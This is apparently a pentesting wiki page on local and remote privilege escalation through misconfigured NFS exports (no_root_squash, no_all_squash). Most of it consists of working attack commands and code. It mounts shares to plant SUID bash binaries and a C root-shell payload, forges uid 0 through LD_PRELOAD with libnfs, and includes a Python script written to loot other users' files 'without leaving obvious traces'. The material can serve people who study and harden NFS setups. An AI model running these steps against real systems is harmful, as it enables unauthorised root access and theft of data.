# NFS no_root_squash/no_all_squash misconfiguration PE

Read the_ **/etc/exports** _file, if you find some directory that is configured as **no_root_squash**, then you can **access** it from **as a client **and **write inside **that directory **as **if you were the local **root **of the machine.

**no_root_squash**: This option basically gives authority to the root user on the client to access files on the NFS server as root. And this can lead to serious security implications.

**no_all_squash:** This is similar to **no_root_squash** option but applies to **non-root users**. Imagine, you have a shell as nobody user; checked /etc/exports file; no_all_squash option is present; check /etc/passwd file; emulate a non-root user; create a suid file as that user (by mounting using nfs). Execute the suid as nobody user and become different user.

## Privilege Escalation

### Remote Exploit

If you have found this vulnerability, you can exploit it:

* **Mounting that directory** in a client machine, and **as root copying** inside the mounted folder the **/bin/bash** binary and giving it **SUID **rights, and **executing from the victim** machine that bash binary.

```bash
#Attacker, as root user
mkdir /tmp/pe
mount -t nfs <IP>:<SHARED_FOLDER> /tmp/pe
cd /tmp/pe
cp /bin/bash .
chmod +s bash

#Victim
cd <SHAREDD_FOLDER>
./bash -p #ROOT shell
```

* **Mounting that directory** in a client machine, and **as root copying** inside the mounted folder our come compiled payload that will abuse the SUID permission, give to it **SUID **rights, and **execute from the victim** machine that binary (you can find here some[ C SUID payloads](payloads-to-execute.md#c)).

```bash
#Attacker, as root user
gcc payload.c -o payload
mkdir /tmp/pe
mount -t nfs <IP>:<SHARED_FOLDER> /tmp/pe
cd /tmp/pe
cp /tmp/payload .
chmod +s payload

#Victim
cd <SHAREDD_FOLDER>
./payload #ROOT shell
```

### Local Exploit

{% hint style="info" %}
Note that if you can create a **tunnel from your machine to the victim machine you can still use the Remote version to exploit this privilege escalation tunnelling the required ports**.\
The following trick is in case the file `/etc/exports` **indicates an IP**. In this case you **won't be able to use** in any case the **remote exploit **and you will need to** abuse this trick**.\
Another required requirement for the exploit to work is that** the export inside `/etc/export`** **must be using the `insecure` flag**.\
\--_I'm not sure that if `/etc/export` is indicating an IP address this trick will work_--
{% endhint %}

**Trick copied from **[**https://www.errno.fr/nfs_privesc.html**](https://www.errno.fr/nfs_privesc.html)****

Now, let’s assume that the share server still runs `no_root_squash` but there is something preventing us from mounting the share on our pentest machine. This would happen if the `/etc/exports` has an explicit list of IP addresses allowed to mount the share.

Listing the shares now shows that only the machine we’re trying to privesc on is allowed to mount it:

```
[root@pentest]# showmount -e nfs-server
Export list for nfs-server:
/nfs_root   machine
```

This means that we’re stuck exploiting the mounted share on the machine locally from an unprivileged user. But it just so happens that there is another, lesser known local exploit.

This exploit relies on a problem in the NFSv3 specification that mandates that it’s up to the client to advertise its uid/gid when accessing the share. Thus it’s possible to fake the uid/gid by forging the NFS RPC calls if the share is already mounted!

Here’s a [library that lets you do just that](https://github.com/sahlberg/libnfs).

#### Compiling the example <a href="compiling-the-example" id="compiling-the-example"></a>

Depending on your kernel, you might need to adapt the example. In my case I had to comment out the fallocate syscalls.

```bash
./bootstrap
./configure
make
gcc -fPIC -shared -o ld_nfs.so examples/ld_nfs.c -ldl -lnfs -I./include/ -L./lib/.libs/
```

#### Exploiting using the library <a href="exploiting-using-the-library" id="exploiting-using-the-library"></a>

Let’s use the simplest of exploits:

```bash
cat pwn.c
int main(void){setreuid(0,0); system("/bin/bash"); return 0;}
gcc pwn.c -o a.out
```

Place our exploit on the share and make it suid root by faking our uid in the RPC calls:

```
LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so cp ../a.out nfs://nfs-server/nfs_root/
LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so chown root: nfs://nfs-server/nfs_root/a.out
LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so chmod o+rx nfs://nfs-server/nfs_root/a.out
LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so chmod u+s nfs://nfs-server/nfs_root/a.out
```

All that’s left is to launch it:

```
[w3user@machine libnfs]$ /mnt/share/a.out
[root@machine libnfs]#
```

There we are, local root privilege escalation!

### Bonus NFShell <a href="bonus-nfshell" id="bonus-nfshell"></a>

Once local root on the machine, I wanted to loot the NFS share for possible secrets that would let me pivot. But there were many users of the share all with their own uids that I couldn’t read despite being root because of the uid mismatch. I didn’t want to leave obvious traces such as a chown -R, so I rolled a little snippet to set my uid prior to running the desired shell command:

```python
#!/usr/bin/env python
import sys
import os

def get_file_uid(filepath):
    try:
        uid = os.stat(filepath).st_uid
    except OSError as e:
        return get_file_uid(os.path.dirname(filepath))
    return uid

filepath = sys.argv[-1]
uid = get_file_uid(filepath)
os.setreuid(uid, uid)
os.system(' '.join(sys.argv[1:]))
```

You can then run most commands as you normally would by prefixing them with the script:

```
[root@machine .tmp]# ll ./mount/
drwxr-x---  6 1008 1009 1024 Apr  5  2017 9.3_old
[root@machine .tmp]# ls -la ./mount/9.3_old/
ls: cannot open directory ./mount/9.3_old/: Permission denied
[root@machine .tmp]# ./nfsh.py ls --color -l ./mount/9.3_old/
drwxr-x---  2 1008 1009 1024 Apr  5  2017 bin
drwxr-x---  4 1008 1009 1024 Apr  5  2017 conf
drwx------ 15 1008 1009 1024 Apr  5  2017 data
drwxr-x---  2 1008 1009 1024 Apr  5  2017 install
```
